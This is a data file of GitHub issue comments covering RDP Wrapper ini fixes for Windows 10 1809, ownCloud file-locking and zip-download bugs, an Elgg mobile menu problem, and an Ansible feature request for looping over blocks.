rdpwrap/stascorp/601/447727460,"Hi, you people are awesome, but there may be some n00bs like me (relatively speaking) out there getting a bit lost. Here are some streamlined instructions based on hajubu, RobertSpir, Scr34mik, et. al., which worked for me. This is for those who have already installed 1.6.2 using the install.bat file and RDPWInst.exe.  Open C\Program Files\RDP Wrapper Copy rdpwrap.ini file to somewhere like the desktop Open that file and add the following text to the end   Open cmd as admin and enter ""net stop TermService"" Go back to C\Program Files\RDP Wrapper and rename or delete rdpwrap.ini file. Move the newly edited rdpwrap.ini file to C\Program Files\RDP Wrapper Open cmd as admin and enter ""net start TermService""  That should work. Thanks for keeping this going! ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/448895969,"Hello, I followed the instructions from gitgotgone exactly but when I try to restart the service with  ""net start TermService"" I get A system error has occured System error 1067 has occured The process terminated unexpectedly I rebooted the computer and still same issue. Anyone have any thoughts? ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/449473166,"I tried everything they said there, it did not work here what I'm going to do, unfortunately, is to leave the 1803 version with the updates blocked until a version that already works with the 1809 termserv .168 thanks ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/449665322,"Instruction from andrePKI worked for me for version 17763.168. Make sure to follow them to the letter, including uninstalling and reinstalling ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/449713052,I noticed that it is very important that you have a newline at the end of the file. Without it the service starts and stops immediately with the same error as @friend ,False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/450316754,"Hi Everyone, I have tried with this .ini file and it worked for me, it's for 10.0.17763.167 version x64 rdpwrap.zip  First, stop the service running CMD as administrator, then run net stop termservice Replace rdpwrap.ini in C\Program Files\RDP Wrapper then run net start termservice Very important Reboot your PC then when your pc rebooted, run RDPConf to check the states, make sure All states are green ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/451101697,"I'm really sorry but I can't get this to work and I think I've ended up in a muddle with my dlls. I am trying to get RdpWrap running on Win 10 Home x64, release 10.0.17763.168. I had it running fine before the 1809 update. I thought I had a recollection of having to copy termsrv.dll and rfxvmt.dll into my system32 folder from my system running Win 10 Pro (also .168) so I did this before running uninstall.bat then install.bat. Looking at the instructions and problems it seems that is not required, just to change the .ini file. Anyway, I get various errors - mostly just ""Not listening"", but I'm concerned as to whether I have the correct dlls now. And what happens in syswow64? That seems to be mentioned occasionally by some people  - should rfxvmt.dll be copied there? Which version? So now I'm not sure I have the correct dlls. Could someone send the correct versions I need to work for Win 10 Home x64 10.0.17763.168 with instructions on where they need to be copied to? Then I can follow the instructions above to reinstall and modify the rdpwrap.ini file. Apologies for being an idiot. Thanks. ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/451700910,"rfcxvmt.dll 10.0.16063.0, 37376 bytes, timestamp Nov. 10th, 2018 termsrv.dll 10.0.17763.168, 1019392 bytes, Dec. 11th 2018 Both DLLs are in system32 only syswow64 is only required for 32bit processes. They see this folder as system32. ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/453217435,"Works for me. Try to add this to c\Program Files\RDP Wrapper\rdpwrap.ini  Last string MUST be empty Dont forget to ""rdpwinst -r"" ;) ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/453220305,"There is issue #606 for build , don't post offtopic. ",False,True,False,rdpwrap/stascorp/601
rdpwrap/stascorp/601/453223003,tell it to cmhowarth ;) ,False,True,False,rdpwrap/stascorp/601
core/owncloud/26374/182914483,"So I just updated from 9.01 to 9.11 and it is my first update. Everything semed fine until I began adding new files and now I have yellow icons, webdav error and very slow syncing (if at all) Not sure what is happening (( Steps to reproduce 1.sync file from desktop client Expected behaviour Tell us what should happen sync file Actual behaviour Tell us what happens instead very slow client stuck on upload for 24 hours now yellow icon on folder but everything green inside uploading new files seems to be working log show a lot of fatal error webdav (file is locked) Server configuration Operating system debian 8.3 latest Web server apache latest Database Mysql latest PHP version latest ownCloud version (see ownCloud admin page) 9.1.1 Updated from an older ownCloud or fresh install updated from 9.01 Special configuration (external storage, external authentication, reverse proxy, server-side-encryption) encryption enabled ",False,True,False,core/owncloud/26374
core/owncloud/26374/253665345,"something I am not understanding also maybe related. My dates are wrong; in the activity tab it says for some tasks ""in 7 hours"" what does that mean ? is it doing a task that needs time ? ",False,True,False,core/owncloud/26374
core/owncloud/26374/253921076,I cannot upload anything now !!!! please help ,False,True,False,core/owncloud/26374
core/owncloud/26374/253922016, Are my permissions correct ? ,False,True,False,core/owncloud/26374
core/owncloud/26374/253929189,"Did a file scan and got these errors Exception while scanning ""files/185d6962245f7a515367d06c2213175e"" is locked 0 /var/www/owncloud/lib/private/Files/Storage/Common.php(668) OC\Lock\DBLockingProvider-&gt;acquireLock('files/185d69622...', 1) 1 /var/www/owncloud/lib/private/Files/Storage/Wrapper/Wrapper.php(584) OC\Files\Storage\Common-&gt;acquireLock('files/Documents...', 1, Object(OC\Lock\DBLockingProvider)) 2 /var/www/owncloud/lib/private/Files/Storage/Wrapper/Wrapper.php(584) OC\Files\Storage\Wrapper\Wrapper-&gt;acquireLock('files/Documents...', 1, Object(OC\Lock\DBLockingProvider)) 3 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(140) OC\Files\Storage\Wrapper\Wrapper-&gt;acquireLock('files/Documents...', 1, Object(OC\Lock\DBLockingProvider)) 4 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(409) OC\Files\Cache\Scanner-&gt;scanFile('files/Documents...', 3, '36390', NULL, true) 5 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(377) OC\Files\Cache\Scanner-&gt;handleChildren('files/Documents...', true, 3, '36390', true, 32831) 6 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(380) OC\Files\Cache\Scanner-&gt;scanChildren('files/Documents...', true, 3, '36390', true) 7 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(380) OC\Files\Cache\Scanner-&gt;scanChildren('files/Documents...', true, 3, '7531', true) 8 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(380) OC\Files\Cache\Scanner-&gt;scanChildren('files/Documents...', true, 3, '7168', true) 9 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(380) OC\Files\Cache\Scanner-&gt;scanChildren('files/Documents...', true, 3, '7136', true) 10 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(380) OC\Files\Cache\Scanner-&gt;scanChildren('files/Documents', true, 3, '26', true) 11 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(380) OC\Files\Cache\Scanner-&gt;scanChildren('files', true, 3, '2', true) 12 /var/www/owncloud/lib/private/Files/Cache/Scanner.php(311) OC\Files\Cache\Scanner-&gt;scanChildren('', true, 3, 1, true) 13 /var/www/owncloud/lib/private/Files/Utils/Scanner.php(195) OC\Files\Cache\Scanner-&gt;scan('', true, 3) 14 /var/www/owncloud/apps/files/lib/Command/Scan.php(158) OC\Files\Utils\Scanner-&gt;scan('/sinewavz') 15 /var/www/owncloud/apps/files/lib/Command/Scan.php(226) OCA\Files\Command\Scan-&gt;scanFiles('user1', '/user1', false, Object(Symfony\Component\Console\Output\ConsoleOutput), false) 16 /var/www/owncloud/3rdparty/symfony/console/Command/Command.php(259) OCA\Files\Command\Scan-&gt;execute(Object(Symfony\Component\Console\Input\ArgvInput), Object(Symfony\Component\Console\Output\ConsoleOutput)) 17 /var/www/owncloud/core/Command/Base.php(158) Symfony\Component\Console\Command\Command-&gt;run(Object(Symfony\Component\Console\Input\ArgvInput), Object(Symfony\Component\Console\Output\ConsoleOutput)) 18 /var/www/owncloud/3rdparty/symfony/console/Application.php(844) OC\Core\Command\Base-&gt;run(Object(Symfony\Component\Console\Input\ArgvInput), Object(Symfony\Component\Console\Output\ConsoleOutput)) 19 /var/www/owncloud/3rdparty/symfony/console/Application.php(192) Symfony\Component\Console\Application-&gt;doRunCommand(Object(OCA\Files\Command\Scan), Object(Symfony\Component\Console\Input\ArgvInput), Object(Symfony\Component\Console\Output\ConsoleOutput)) 20 /var/www/owncloud/3rdparty/symfony/console/Application.php(123) Symfony\Component\Console\Application-&gt;doRun(Object(Symfony\Component\Console\Input\ArgvInput), Object(Symfony\Component\Console\Output\ConsoleOutput)) 21 /var/www/owncloud/lib/private/Console/Application.php(146) Symfony\Component\Console\Application-&gt;run(NULL, NULL) 22 /var/www/owncloud/console.php(94) OC\Console\Application-&gt;run() 23 {main} ",False,True,False,core/owncloud/26374
core/owncloud/26374/253929862,xxxxx@friend/var/www/owncloud$ sudo -u www-data php owncloud/updater/application.php Could not open input file owncloud/updater/application.php ,False,True,False,core/owncloud/26374
core/owncloud/26374/253935199,I think I found the issue. I have this folder I deleted a while ago that shows on my web interface only ant it says pending.. All files in the folders are locked. Trying to delete the folder from the web interface gives an error. What to do ? Can I run a script to fix this ? Looks like a db issue ? ,False,True,False,core/owncloud/26374
core/owncloud/26374/253937827,"Making more progress but now completely stuck. I recreated the folder manually and began downloading some of the files from the web interface and placing them on my desktop client folder. Somehow this seemed to unblock the folder and all the files in the folder got deleted on the web too but I am left with the main folder and one subfolder that I cannot delete.  all I get when I try to delete manually from the web interface is Error deleting file ""Images"".  when I try deleting ""images "" from the client nothing happens and the file is still on the web interface  ",False,True,False,core/owncloud/26374
core/owncloud/26374/253939084,"sudo -u www-data php /var/www/owncloud/updater/application.php ownCloud updater 1.0 - CLI based ownCloud server upgrades Checking system health. [Symfony\Component\Process\Exception\ProcessFailedException]   The command ""php /var/www/owncloud/occ --no-warnings applist --output=json '--shipped fal   se'"" failed.   Exit Code 1(General error)   Output                                                                                        Error Output                                                                                [Symfony\Component\Console\Exception\RuntimeException]                                     The ""--shipped false"" option does not exist.                                                applist [--output [OUTPUT]] [--shipped SHIPPED] upgradecheckSystem ",False,True,False,core/owncloud/26374
core/owncloud/26374/253941732,any of this help ? Im really stuck here... Any way to rebuild my database ? why do I get jobs happening in 7 hours on the web interface ? Really stuck !!!! Webdav is taking the piss ( ,False,True,False,core/owncloud/26374
core/owncloud/26374/253943443,no support at all then ? I provided a lot of information ... Should I move to nextcloud then ? (((( ,False,True,False,core/owncloud/26374
core/owncloud/26374/253995433,"A perfect base to get help  Being impatient Flooding the issue with unnecessary comments instead of using the edit button Throwing stuff like ""should i move to nextcloud"" around -&gt; They mostly also don't want such users Thinking that a bugtracker is an instant support channel  What you could do here to actually provide all needed info once some one has time too look after this is, to strip down / delete all your comments and collect all real info which you think are relevant for this issue in your initial report. ",False,True,False,core/owncloud/26374
core/owncloud/26374/253997290,"Thanks RealRancor for the usual reply where you never... I have become used to it by now.. All my posts are real info. If it is not real enough for you then don't reply... Sorry Im not a master at programing like you.  If anyone if offended by my comment on nextcloud and saying that ""they don't want such user"" is real crazy; I comment what I want. I have given a huge amount of technical infos and it is not the first time I get file locked on webdav. I had that with oc 8.xx and now 9.xx and the net has plenty of example like mine so if there is no fix for that or method to diagnose then I can't rely on oc...  So now do you have the slightest clue to point me in the right direction ? If you don't then ask for the specific info you need. That is a CONSTRUCTIVE attitude. If you don't know just let me be but policing like you do is just being a jerk. ",False,True,False,core/owncloud/26374
core/owncloud/26374/253997831,"You're really expecting that one reads through 10 comments full of ""no support at all then"" or posts of wrong occ usage to get all needed info? And no, these posts are not ""real info"". So please follow my advise and strip down your comments to the minimum. ",False,True,False,core/owncloud/26374
core/owncloud/26374/253998293,whatever... Maybe someone else will help and even if I wanted to do what you say I could not because each post is a different side of the issue and I don't understand all the interactions so all I would do is copy paste which would not change anything. ,False,True,False,core/owncloud/26374
core/owncloud/26374/254153511,"Try switching to system cron if you're using ajax cron, ref ",False,True,False,core/owncloud/26374
core/owncloud/26374/255997760,please let us now whether using system cron helped solve the issue ,False,True,False,core/owncloud/26374
core/owncloud/26374/268561246,Please reopen if it didn't ,False,True,False,core/owncloud/26374
Elgg/Elgg/6779/32144022,"using opera mobile browser(java,symbian) aalborg theme menu(elgg.nav) button not working. ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41282220,Which one? Do you have a screenshot? ,False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41349905,i try elgg_zone handheld theme....working fine... ,False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41356653,"Don't know much about symbian, but isn't it dead? Handheld uses a jQuery plugin, jPanelMenu, aalborg uses rel=""toggle"".  @friend Does toggle work elsewhere? ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41388478,"@friend try aalborg in android,java,blackberry devices.but also same result. but handheld working nice.. so my suggestion is use jQuery plugin, jPanelMenu use in aalborg.it will be more responsive elgg. ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41417058,"I do prefer the left fly out menu approach to the current drop down approach... On Apr 25, 2014 548 AM, ""vikram chandran"" notifications@friend.com wrote ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41424803,"@friend could you please check the toggle elsewhere? Open close widgets,  Profile &gt; Owner menu &gt; Admin options ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41450145,@friend agree... @friend No...i don't know about toggle ,False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41463032,"if aalborg more responsive theme my suggestion please you will use jQuery plugin, jPanelMenu in aalborg or handheld for elgg 1.9. my view is elgg 1.9 fully mobile friendly aalborg is not enough.handheld into core plugin.. ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41463113,"I am strongly opposed to any more of UI JS in core. Aalborg does what it says - it's responsive. These libs are like weed, impossible to get rid of in a custom project (looking at fancy box/color box) ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41463346,"Agree with @friend @friend I was asking you to check elgg toggle functionality in general, just to know if it's working at all. As examples, try to open/close widgets, try to open/close Admin options menu. ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41463367,@friend what is a solution for make elgg 1.9 more responsive project. you have any idea buddy. ,False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41463476,"@friend ""As examples, try to open/close widgets, try to open/close Admin options menu"" widgets only working for normal website.i thinks your mobilize not support for widgets. ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41463600,@friend  elgg toggle is not enough for fully responsive project. you have any idea? ,False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41464051,"Perhaps if you take on a different tone I could give some pointers. But given the attitude I am not compelled. Aaborg is a quality theme that is fully responsive. On Apr 26, 2014 1049 AM, ""vikram chandran"" notifications@friend.com wrote ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41473660,"Agreed we should avoid weighing down Elgg with more (overly specific) JS libs. I think one question here is whether we even want to support opera mobile? The other question is why is our current solution failing? Finally Do we want to try to fix our toggle button hack, or should we perhaps just wait until we have a more proper JS framework in core and revisit this then? ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41481053,"I definitely care not for Opera. I think it's best to leave UI as is in 1.9. It serves its purpose enough. Everything else can be implemented in a plugin. This doesn't affect an average user, and the developer will find a workaround if need be On Apr 26, 2014 645 PM, ""Evan Winslow"" notifications@friend.com wrote ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41481238,"I've tested on my android and problem exists only in opera mini, in normal opera for android problem does not occur. For reference, i've set up 1.9 for testing  curious what's broken, but there's nothing making opera mini tests easy. I'd love to apply fix if we knew exactly what's wrong. Blindly using jPanelMenu that drags additional lib with it is not a viable solution. I say let's not support opera mini. We want to move forward with requirements (html5, php 5.3+) and don't have enough resources to focus on exotic platforms. I'd gladly accept simple solution for opera mini if there would be someone willing to write PR. Not a priority for me. ",False,True,False,Elgg/Elgg/6779
Elgg/Elgg/6779/41482892,"I don't think we need to explicitly support opera mini. If it works on opera for android then this is definitely mini's problem, not ours. On Apr 26, 2014 221 PM, ""Paweł Sroka"" notifications@friend.com wrote ",False,True,False,Elgg/Elgg/6779
core/owncloud/8282/31868186,"I am just assuming the issue is non-ASCII, but I have only tested with Japanese charset. The result is that it just downloads an empty zip archive. It appears that even if one file contains unsupported chars, the entire operation will fail. ",False,True,False,core/owncloud/8282
core/owncloud/8282/40908488,For UTF-8 it is not a problem. Probably only reproducible for Asian language characters. Maybe it could be useful to add a sample filename just for us to try. ,False,True,False,core/owncloud/8282
core/owncloud/8282/40958599,@friend I'm no quite sure if I understand your issue correctly. Can I ask you to follow our contributions guidelines?  the use of our issue template ,False,True,False,core/owncloud/8282
core/owncloud/8282/40969677,"Steps to reproduce Select multiple files to download, hit download. Expected behaviour It downloads an archive of all selected files. Actual behaviour It downloads an empty archive. Server configuration Operating system Fedora 19 Web server Apache 2.4.7-1.fc19 Database MariaDB (MySQL) 15.5.36-1.fc19 PHP version 5.5.10 ownCloud version 6.0.2-8.2 Updated from an older ownCloud or fresh install Fresh List of activated apps The content of config/config.php 'instanceid' =&gt; 'ocb9b921cd1a',   'passwordsalt' =&gt; '2e948c45dc301325c0ba2d087e0c9b',   'trusteddomains' =&gt;   array (     0 =&gt; '&lt;redacted&gt;',   ),   'datadirectory' =&gt; '/data/owncloud',   'dbtype' =&gt; 'mysql',   'version' =&gt; '6.0.2.2',   'installed' =&gt; true,   'forcessl' =&gt; true,   'maxZipInputSize' =&gt; 5368709120,   'allowZipDownload' =&gt; true,   'dbhost' =&gt; 'localhost',   'dbtableprefix' =&gt; 'oc', Are you using external storage Just a local disk directory Are you using encryption yes Client configuration Browser Google Chrome 34.0.1847.116 m Operating system Windows 7 x86_64 Logs Web Server Error Log [Mon Apr 21 113859.432555 2014] [sslerror] [pid 2163] [client &lt;redacted&gt;36327] AH02042 rejecting client initiated renegotiation [Mon Apr 21 193913.078443 2014] [access_compaterror] [pid 2165] [client &lt;redacted&gt;32950] AH01797 client denied by server configuration /var/www/html/owncloud/data/htaccesstest.txt [Mon Apr 21 194628.892562 2014] [access_compaterror] [pid 969] [client &lt;redacted&gt;32965] AH01797 client denied by server configuration /var/www/html/owncloud/data/htaccesstest.txt Web Server Log &lt;redacted&gt; - - [21/Apr/2014192806 +0000] ""GET /index.php/apps/files/ajax/download.php?dir=%2FTorrents&amp;files=%5B%22(%E5%90%8C%E4%BA%BACG%E9%9B%86)+%5B%5D(%E3%82%AD%E3%83%AB%E3%83%A9%E3%82%AD%E3%83%AB).zip%22%2C%22.zip%22%2C%22Kill+La+Kill.zip%22%2C%22aaaa.zip%22%2C%22%5BAAAA%5D+%E5%85%A8%E8%87%AA%E5%8B%95%E3%82%AD%E3%83%AB%E3%83%9E%E3%82%B7%E3%83%BC%E3%83%B3+(%E3%82%AD%E3%83%AB%E3%83%A9%E3%82%AD%E3%83%AB).zip%22%5D HTTP/1.1"" 200 - ",False,True,False,core/owncloud/8282
core/owncloud/8282/40969727,テスト試し ^ An example set of chars for you to try. ,False,True,False,core/owncloud/8282
core/owncloud/8282/40971171,Thx Von Samsung Mobile gesendet -------- Ursprüngliche Nachricht -------- Von Ricky Burgin notifications@friend.com  Datum21.04.2014  2151  (GMT+0100)  An owncloud/core core@friend.github.com  Cc Thomas Müller thomas.mueller@friend.eu  Betreff Re [core] Download as zip fails when contents contain non-ASCII   chars (#8282) テスト試し ^ An example set of chars for you to try. — Reply to this email directly or view it on GitHub. ,False,True,False,core/owncloud/8282
core/owncloud/8282/41006176,"Hi, this issue has a temporarily solution by someone.  Windows system zip does not fully support utf-8, I don't know if Linux system has this problem. Actually there is something in the Zip file but Zip just can't read the utf-8 names. You can use other software instead. (Help translate the web site.) Method 1 In the web site, someone modified the lib/files.php  by adding ""iconv"" before zipping Chinese file names. But I've test this method and found that it may cause another problem is that the problem will still exist if you try to convert other language file names not belong to this encoding. Method 2 They just simply use the unzip software that supports utf-8 when unzip such as bandzip. ",False,True,False,core/owncloud/8282
core/owncloud/8282/41027447,"Except the problem is server-side, and the server-side OS is Linux. The archive that gets created is also a zero-byte archive. ",False,True,False,core/owncloud/8282
core/owncloud/8282/41027737,@friend would it be possible for you to test this on the github master branch? We adopted the zip generation heavily for OC7 and I guess this issue will be solved. ,False,True,False,core/owncloud/8282
core/owncloud/8282/41031845,"If somebody could throw me an account temporarily on an OC7 installation, I'd be happy to try. ",False,True,False,core/owncloud/8282
core/owncloud/8282/41244080,@friend  I just switch my server from Windows to Ubuntu. Chinese zip file just work fine except with file name screwed up. But you won't see anything unless you open the archive with 7-zip. You mean when you download something from browser it shows 0 byte? OS Ubuntu 14.04 Server Apache 2.4.7 Client Windows 8.1 pro browser  Mozilla firefox 29 ,False,True,False,core/owncloud/8282
core/owncloud/8282/41335529,"That's exactly what I mean, the archive is not created on the server-side properly. I also use 7zip. ",False,True,False,core/owncloud/8282
core/owncloud/8282/41371642,Here on Windows 7  ,False,True,False,core/owncloud/8282
core/owncloud/8282/41371703,@friend @friend I guess we can close this issue - right? Thanks a lot! ,False,True,False,core/owncloud/8282
core/owncloud/8282/41417519,"No, the issue isn't that the characters get misrepresented, the issue is that they cause the actual archive creation operation to fail and spit out a zero-byte archive. Is anybody actually reading what I am writing? ",False,True,False,core/owncloud/8282
core/owncloud/8282/41429293,Are you actually having a look at my screenshots? The archives are fully created in OC7 - you issue no longer exists. ,False,True,False,core/owncloud/8282
core/owncloud/8282/41429877,"Sorry, I misinterpreted the second screenshot as being OC6, it's been a long day. Please forgive my attitude in the last message. ",False,True,False,core/owncloud/8282
core/owncloud/8282/41431120,Forgiven - has been a long day here as well wink ,False,True,False,core/owncloud/8282
core/owncloud/8282/85499334,"Hi, whoever come to this for zip problems on windows 7, i found a solution on this and want to share with you smile The problem actually belongs to zip extractor of windows 7. It dose not support UTF-8 encoding file name. However Microsoft provided a hotfix to this problem  install the hotfix and restart windows to see how it works sunglasses ",False,True,False,core/owncloud/8282
ansible/ansible/13262/118433547,"Issue Type Feature Idea Ansible Version Ansible 2.0.0_rc-1 Ansible Configuration NA Environment Ubuntu 15.10 Summary There are a number of use-cases where it would be valuable to be able to loop over a block of tasks, such that a few tasks are done in order, and that specific block of tasks are looped over for some set of values. It seems that the new block functionality could lend itself well to this if you were to enable looping over blocks. Steps To Reproduce Expected Results Actual Results ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/159026851,"@friend no, I absolutely understand the functionality here. Currently you can only loop over a certain task, but I want to be able to loop over a set of tasks in series. I need to run (task 1 then task 2)x3 instead of (task 1)x3 then (task2)x3 Currently the only way to do this is to create a script that does tasks 1 and 2, or perhaps call a playbook from within a playbook. Looping over roles would allow for the same behavior. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/159034897,"you can loop over includes, sorry about the response, I misread this as a bug report ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/159036410,"@friend I hadn't seen the docs on looping over includes, which seems the better solution than what I have suggested, as my method could quickly result in code that is more difficult to follow. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/173885814,plus one for this feature. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/176852296,"plus one first thing I tried after installing 2.0, disappointed it doesn't work... ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/176979401,plus one (feature would be very helpful) ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/177003315,"plus one  But it should be able to manage tasks with ""with_items"" so ""item"" might not be the good keyword here (speaking of the first message). Looping over an include means you need a new file. Looping over a block is way more cool ! ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/177551647,"plus one, but to prevent naming collisions with  from loops, loop from block could be name . ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/177891205,plus one very interesting feature to work with plus one ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/178271851,"I hate to plus one, but I was very sad to discover you can't do this.  As @friend mentions, block_item would be a good name for the block item. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/185932399,plus one this would be a really useful feature ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/188361439,plus one I see few possible use-cases for this feature. - It would be really nice to have it. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/188366479,  ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/190376485,plus one This will be useful ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/193142373,plus one This would be exactly what I need right now only then with with_dict ;) ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/193668973,plus one For all types of loops! ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/195927967,"FWIW, Github now has a plus one feature thingie -) ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/200271067,"Huge plus one right here, this would take Ansible to a whole new level smile ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/200438832,"running , this seems to be working @friend ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/201463542,Using 2.1.0 devel and getting ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/201492317,"I gave it a try too and got the same error, here's my code ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/202399118,"It's wierd, but the YAML validator I use formats it that way, works like a charm. Here's the entire playbook ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/202461872,"yea I haven't tried using , only . I don't see it as an example in the docs, but I would imaging that would be a very popular use case, so I would open a new feature request ticket. @friend has confirmed that  is not currently able to work with ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/202493543,@friend That comment from @friend is only about current functionality. This is a feature request to allow looping over blocks (meaning with_items and other types of supported loops) ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/202497163,@friend yep! for some reason I thought this was a ticket for the block feature in general... Feel free to ignore me! ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/202616724,"Forgive me folks, I'm a little confused.  Is this feature already implemented in the upcoming Ansible 2.1.0? Cheers Fotis ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/202997642,"@friend I don't believe so, but as a workaround you can loop over includes as suggested by @friend ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/203091695,"@friend ah cool, thanks for the reply mate smile ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/204789364,includes are very slow! plus one ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/207625909,"Ah, ok, so now I know I hit that wall too... omg, please do it! Blocks are screaming ""please loop me!"" so loud... ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/209965549,"I just came here after reading in five different places that you should not loop over includes and it should never have been documented in the first place. I started looping over includes because I wanted to loop over parametrised roles, but you can’t, and it’s suggested to pass the array to the role and loop inside the role instead. But I don’t want to add the loop to every task of my role, it’s ugly, and I can’t loop over a block, and I shouldn’t loop over an include. So what should I do? I have an array defining web sites and a role creating a user and an Apache virtual host for a web site. So I pass  to the role, and in the role  I include a task file that creates the user and virtual host but then if I use  with another variable on any task inside , the  and  variables clash. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/209974443,"@friend you are reading out of date stuff, looping over includes is supported again in Ansible &gt;=2.0. it was a feature in &lt;1.6 but it was badly implemented, which is why it was first discouraged, then deprecated and finally removed. But now it is back! ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/212305391,"@friend Thank you. My loop was not working, so when I read that it was discouraged on includes, it seemed to fit my problem and I didn’t realise it was in old threads. Knowing that it’s supposed to work, I was able to fix it by using a fact for the outer loop item and in the included file ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/212477150,@friend There is now a built in reactions function for voting on issues. please add a thumbs up reaction to the first comment instead of your own comment ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/222994763,@friend Any chance of this making it into the roadmap? ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/222996941,"-10% for every comment that is just 'plus one' @friend, sillyness aside, this is not something anyone in core is looking at implementing right now, so unless someone in the community picks it up I doubt it will make an upcoming roadmap or related release. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/223030553,Thanks for the honest update ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/223270956,It would be nice to be able to specify variable name to allow nested block  ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/223300454,@friend  please lets not hijack threads for different features that are already implemented (loop_control/label) ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/225615052,"I like the idea of the block, and the try-catch works well. But I've also become a fan of looping over include files and all I can imagine is my single main.yml turning into a massive pile of looping blocks... and I'm not a fan of that already. My first instinct that I thought looping blocks might be a bad idea was when I convinced myself I must have one. And then I realized I was being lazy because I didn't want cut and paste the tasks out to a separate include file. That's on me. I've come to appreciate that the current way of doing things forces me break up my files and add a little logic to the main.yml file. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/226082594,"@friend I believe there are performance implications to looping over includes, and sometimes it is necessary to run tasks 1, 2, and 3 as a group, in that order, an arbitrary number of times determined by some other factor. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/233941766,"Block loops would be a welcome addition. I understand people are saying to use a loop over an include, which I do in some cases, but this essentially applies 'with_items' to every task in the included file, overwriting any existing 'with_items' you may have in the included file. If I only want to run a loop over a block of tasks I would currently have to split those out into a separate file. I'll take a look at this when I get some free time as I've had requirements in the past month where a loop block would have been ideal. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/233943265,"@friend With Ansible &gt;=2.0, you can specify the name of the loop variable. Like that it doesn't overwrite the default  variable in the include file. ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/233947475,@friend Thanks for that! I will give that a go. I must have been looking at an old copy of the docs as I don't recall seeing the 2.0 update in there. ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/234238806,"Hi, with new networking modules (IOS) I attempt to list the interfaces with a particular VLAN. With ""looping over blocks"" feature I shoud obtain it with the following tasks The ""looping over includes"" feature can't works in this case. I think the requested feature is essential for network automation. Thanks ",False,True,False,ansible/ansible/13262
ansible/ansible/13262/234258705,@friend I don't see a problem to use includes ,False,True,False,ansible/ansible/13262
ansible/ansible/13262/234977800,"Hi, with the following setup it works if i setup serial1 Otherwise it will run ""VLAN on interfaces"" for host B about a configline of host A with an unsettled int. I can't understand that behaviour and how prevent it. Thanks ",False,True,False,ansible/ansible/13262
